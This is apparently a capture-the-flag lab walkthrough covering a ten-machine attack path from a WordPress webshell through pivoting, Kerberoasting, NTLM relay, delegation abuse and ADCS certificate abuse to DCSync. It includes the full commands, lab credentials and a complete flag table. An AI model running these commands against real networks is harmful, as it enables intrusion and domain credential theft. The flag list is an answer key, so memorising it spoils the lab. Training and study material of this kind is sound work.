# Prolab Attack Flow - Detailed Walkthrough

## Overview
This document describes the intended 10-machine attack path requiring web exploitation, network pivoting, and advanced Active Directory protocol abuse.

---

## Phase A: Perimeter Breach & Pivoting

### 1. DMZ-WEB01 (192.168.50.10) — Initial Access

**Attack Vector:** Vulnerable WordPress CMS with RCE file upload plugin + SSRF

**Steps:**
1. Port scan DMZ-WEB01, discover Apache on port 80
2. Enumerate WordPress (`wpscan --url http://192.168.50.10/`)
3. Discover `corp-file-manager` plugin
4. Upload PHP webshell via unauthenticated file upload:
   ```bash
   curl -F "file=@shell.php" "http://192.168.50.10/wp-admin/admin-ajax.php?action=corp_upload"
   ```
5. Access webshell at `/wp-content/uploads/corp-files/shell.php`
6. **user.txt** → `/home/www-data/user.txt`

**Privilege Escalation:**
- Option A: Writable root cron script at `/opt/corp-maintenance.sh`
- Option B: Wildcard injection in root cron: `tar czf /tmp/uploads-backup.tar.gz *`
- Option C: SUID binary `corp-backup` with PATH hijacking

7. **root.txt** → `/root/root.txt`

### 2. DMZ-MAIL01 (192.168.50.11) — Persistence & Pivot

**Attack Vector:** Password reuse from CMS credentials file

**Steps:**
1. Find `.wp-credentials.bak` on WEB01: `backup:CmsAdmin@2024!`
2. SSH into MAIL01: `ssh backup@192.168.50.11`
3. **user.txt** → `/home/backup/user.txt`
4. Read internal network notes at `~/.internal_notes.txt`
5. Establish SOCKS proxy: `ssh -D 1080 backup@192.168.50.11`
6. Or use Chisel: `chisel server -p 8888 --socks5` / `chisel client ...`

**Privilege Escalation:**
- Writable root cron script at `/opt/mail-processor.sh`

7. **root.txt** → `/root/root.txt`

---

## Phase B: Internal Recon & Foothold

### 3. DEV-LINUX01 (172.16.50.30) — Credential Harvesting

**Attack Vector:** Exposed `.git` directory with AD credentials in commit history

**Steps (through SOCKS proxy):**
1. Browse to `http://172.16.50.30/` through proxy
2. Discover `.git` directory (directory listing enabled)
3. Dump git repository: `git-dumper http://172.16.50.30/.git ./repo`
4. Extract credentials from git history:
   ```bash
   git log --all --full-history -- ldap-config.php
   git show <commit>:ldap-config.php
   ```
5. Extract: `r.martinez / Robert2024!` and `svc_webapp / W3bApp!Service`
6. **user.txt** → `/home/devuser/user.txt`

**Privilege Escalation:**
- SUID binary: `/usr/local/bin/corp-search` (find with SUID)
  ```bash
  /usr/local/bin/corp-search / -exec /bin/sh -p \;
  ```

7. **root.txt** → `/root/root.txt`

### 4. WS01-WIN10 (172.16.50.21) — Windows Entry Point

**Attack Vector:** WinRM access with harvested credentials + unquoted service path

**Steps:**
1. Use r.martinez credentials via WinRM through proxy:
   ```bash
   proxychains evil-winrm -i 172.16.50.21 -u r.martinez -p 'Robert2024!'
   ```
2. **user.txt** → `C:\Users\Public\user.txt`
3. Enumerate unquoted service paths:
   ```powershell
   wmic service get name,pathname | findstr /v "\"" | findstr /i "program files"
   ```
4. Discover `CorpUpdateSvc` with unquoted path
5. Drop payload at `C:\Program Files\Corp Internal\Corp.exe`
6. Restart service or wait for reboot → SYSTEM shell

7. **root.txt** → `C:\Users\Administrator\Desktop\root.txt`

---

## Phase C: Lateral Movement & Privilege Escalation

### 5. FS01-WIN2019 (172.16.50.11) — Coercion & Relay

**Attack Vector:** PrinterBug/PetitPotam + NTLM Relay (SMB signing disabled on WS01/APP01)

**Steps:**
1. Set up ntlmrelayx targeting WS01 or APP01 (SMB signing disabled):
   ```bash
   ntlmrelayx.py -t smb://172.16.50.21 -smb2support
   ```
2. Trigger PrinterBug on FS01:
   ```bash
   python3 printerbug.py corp.local/r.martinez:Robert2024!@172.16.50.11 <attacker_ip>
   ```
3. FS01 machine account authenticates to attacker → relayed to WS01
4. Dump SAM/LSA secrets from WS01

5. **root.txt** → `C:\Users\Administrator\Desktop\root.txt` (via relayed admin access)

### 6. DB01-WIN2019 (172.16.50.12) — MSSQL Abuse

**Attack Vector:** Crackable service account + xp_cmdshell

**Steps:**
1. Kerberoast `svc_mssql` TGS or use credentials from IT$ share on FS01:
   ```
   sa / SqlServer@2024!
   ```
2. Connect to MSSQL:
   ```bash
   proxychains mssqlclient.py sa:'SqlServer@2024!'@172.16.50.12 -port 1433
   ```
3. Execute OS commands via xp_cmdshell:
   ```sql
   EXEC xp_cmdshell 'whoami';
   EXEC xp_cmdshell 'type C:\Users\Public\user.txt';
   ```
4. **user.txt** → `C:\Users\Public\user.txt`
5. Upload reverse shell via xp_cmdshell for interactive access

6. **root.txt** → `C:\Users\Administrator\Desktop\root.txt`

### 7. APP01-WIN2016 (172.16.50.13) — Kerberoasting

**Attack Vector:** Service account with SPN and crackable password

**Steps:**
1. Using any domain user, request TGS for SPN-registered accounts:
   ```bash
   GetUserSPNs.py corp.local/r.martinez:Robert2024! -dc-ip 172.16.50.10 -request
   ```
2. Crack `svc_webapp` hash offline:
   ```bash
   hashcat -m 13100 hash.txt wordlist.txt
   ```
3. Password: `W3bApp!Service`
4. Authenticate to APP01:
   ```bash
   evil-winrm -i 172.16.50.13 -u svc_webapp -p 'W3bApp!Service'
   ```
5. **user.txt** → `C:\Users\Public\user.txt`
6. **root.txt** → `C:\Users\Administrator\Desktop\root.txt` (svc_webapp has admin rights)

---

## Phase D: Domain Domination

### 8. MON01-LINUX (172.16.50.40) — LDAP Credential Extraction

**Attack Vector:** Cleartext LDAP bind credentials in monitoring config

**Steps:**
1. Access monitoring dashboard at `http://172.16.50.40/monitoring/`
2. Login with `admin / MonDashboard@2024` (or brute force)
3. HTML source reveals: `<!-- Config: /etc/corp-monitoring/ldap.conf -->`
4. Read config file (via LFI or SSH access):
   ```
   bind_dn = CN=svc_monitoring,OU=Service Accounts,DC=corp,DC=local
   bind_pw = M0nitor!ng2024
   ```
5. Use `svc_monitoring` for LDAP enumeration of the entire domain

6. **root.txt** → `/root/root.txt`

### 9. WS02-WIN11 (172.16.50.22) — Constrained Delegation Abuse

**Attack Vector:** Constrained Delegation → Silver Ticket for DC CIFS

**Steps:**
1. Compromise `svc_ws02` account (password: `Deleg@te2024!`)
2. Verify delegation:
   ```bash
   findDelegation.py corp.local/svc_ws02:Deleg@te2024! -dc-ip 172.16.50.10
   ```
3. Use S4U2Self + S4U2Proxy to forge service ticket:
   ```bash
   getST.py -spn cifs/DC01.corp.local -impersonate Administrator corp.local/svc_ws02:Deleg@te2024!
   ```
4. Access DC01 via CIFS with forged ticket:
   ```bash
   export KRB5CCNAME=Administrator.ccache
   smbclient.py -k -no-pass DC01.corp.local
   ```

5. **user.txt** → `C:\Users\Public\user.txt`
6. **root.txt** → `C:\Users\Administrator\Desktop\root.txt`

### 10. DC01-WIN2022 (172.16.50.10) — Certificate Abuse & DCSync

**Attack Vector:** ESC1/ESC8 certificate template abuse → Domain Admin → DCSync

**Steps:**

**Option A: ESC1 (Enrollee Supplies Subject)**
1. Find vulnerable template:
   ```bash
   certipy find -u r.martinez@corp.local -p Robert2024! -dc-ip 172.16.50.10
   ```
2. Request certificate as Administrator:
   ```bash
   certipy req -u r.martinez@corp.local -p Robert2024! -ca CORP-CA -template CorpWebServer -upn administrator@corp.local
   ```
3. Authenticate with certificate:
   ```bash
   certipy auth -pfx administrator.pfx -dc-ip 172.16.50.10
   ```

**Option B: ESC8 (NTLM Relay to Web Enrollment)**
1. Start relay to ADCS web enrollment:
   ```bash
   ntlmrelayx.py -t http://172.16.50.10/certsrv/certfnsh.asp -smb2support --adcs
   ```
2. Trigger authentication coercion (PetitPotam)
3. Relay captured auth to request certificate

**Final: DCSync**
```bash
secretsdump.py corp.local/administrator@172.16.50.10 -just-dc-ntlm
```

4. **root.txt** → `C:\Users\Administrator\Desktop\root.txt`

---

## Flag Summary

| # | Machine | user.txt | root.txt |
|---|---------|----------|----------|
| 1 | DMZ-WEB01 | `black0ps{dmz_w3b_f00th0ld_4ch13v3d}` | `black0ps{dmz_w3b_r00t_pwn3d}` |
| 2 | DMZ-MAIL01 | `black0ps{m41l_s3rv3r_4cc3ss}` | `black0ps{m41l_p1v0t_p01nt}` |
| 3 | DEV-LINUX01 | `black0ps{g1t_cr3d_h4rv3st}` | `black0ps{d3v_s3rv3r_0wn3d}` |
| 4 | WS01-WIN10 | `black0ps{w1nr3m_f00th0ld}` | `black0ps{unqu0t3d_p4th_pr1v3sc}` |
| 5 | FS01-WIN2019 | — | `black0ps{pr1nt_sp00l3r_r3l4y}` |
| 6 | DB01-WIN2019 | `black0ps{mssql_sh3ll_4cc3ss}` | `black0ps{xp_cmdsh3ll_syst3m}` |
| 7 | APP01-WIN2016 | `black0ps{k3rb3r04st_cr4ck3d}` | `black0ps{4pp_s3rv3r_0wn3d}` |
| 8 | MON01-LINUX | — | `black0ps{ld4p_cr3ds_3xtr4ct3d}` |
| 9 | WS02-WIN11 | `black0ps{d3l3g4t10n_4bus3}` | `black0ps{s1lv3r_t1ck3t_f0rg3d}` |
| 10 | DC01-WIN2022 | — | `black0ps{d0m41n_4dm1n_dcsync}` |

**Total: 17 flags (7 user.txt + 10 root.txt)**
